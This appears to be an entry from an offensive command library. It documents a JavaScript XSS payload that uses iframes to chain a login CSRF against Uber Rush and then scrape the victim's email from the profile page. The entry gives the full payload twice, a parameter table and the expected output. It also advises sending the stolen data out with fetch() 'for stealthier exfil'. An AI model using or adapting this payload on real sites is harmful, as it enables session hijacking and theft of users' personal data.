---
data: >-
  //Create the iframe to log the user to rush

  var rushReg = document.createElement('iframe');

  rushReg.setAttribute('src',
  'https://getrush.uber.com/oauth/login?original=https://rush.uber.com');

  //rushReg.onload = theOther;

  document.body.appendChild(rushReg);

  alert('done');

  //End loading rush


  //Wait a few seconds, then load his rush profile page

  setTimeout(function() {

  var profileIframe = document.createElement('iframe');

  profileIframe.setAttribute('src', 'https://getrush.uber.com/business');

  profileIframe.setAttribute('id', 'pi');

  document.body.appendChild(profileIframe);

  //Extract his email

  profileIframe.onload = function() {

  var d = document.getElementsByClassName('input-group')[0].innerHTML;

  alert(d);

  }

  }, 9000);
tags:
  - xss
  - iframe
  - exfiltration
type: command
output: Alert 'done'; alert with email HTML
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:14.493Z'
id: 2fcf2be1-c17c-4cba-ad1b-7cc3170104ea
verified: false
validated: true
submitted: true
---
# javascript-iframe-chaining-rush-theft

## Command

```javascript
//Create the iframe to log the user to rush
var rushReg = document.createElement('iframe');
rushReg.setAttribute('src', 'https://getrush.uber.com/oauth/login?original=https://rush.uber.com');
//rushReg.onload = theOther;
document.body.appendChild(rushReg);
alert('done');
//End loading rush

//Wait a few seconds, then load his rush profile page
setTimeout(function() {
var profileIframe = document.createElement('iframe');
profileIframe.setAttribute('src', 'https://getrush.uber.com/business');
profileIframe.setAttribute('id', 'pi');
document.body.appendChild(profileIframe);
//Extract his email
profileIframe.onload = function() {
var d = document.getElementsByClassName('input-group')[0].innerHTML;
alert(d);
}
}, 9000);
```

## Description

This JavaScript code, executed via XSS, creates iframes to chain login CSRF to Uber Rush and scrape email data from the profile page using DOM queries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URLs for login and profile iframes | Yes |
| className | '.input-group[0]' for email container | Yes |
| setTimeout | 9000ms delay for session settle | Yes |

## Examples

### Basic Usage

Inject full script as above for alert-based exfil.

### Advanced Usage

Modify onload to send data via fetch() instead of alert for stealthier exfil.

## Expected Output

First alert 'done' after login iframe append; second alert with innerHTML containing email after timeout.

## Related

- [[commands/xss-payload-alert-injection]]
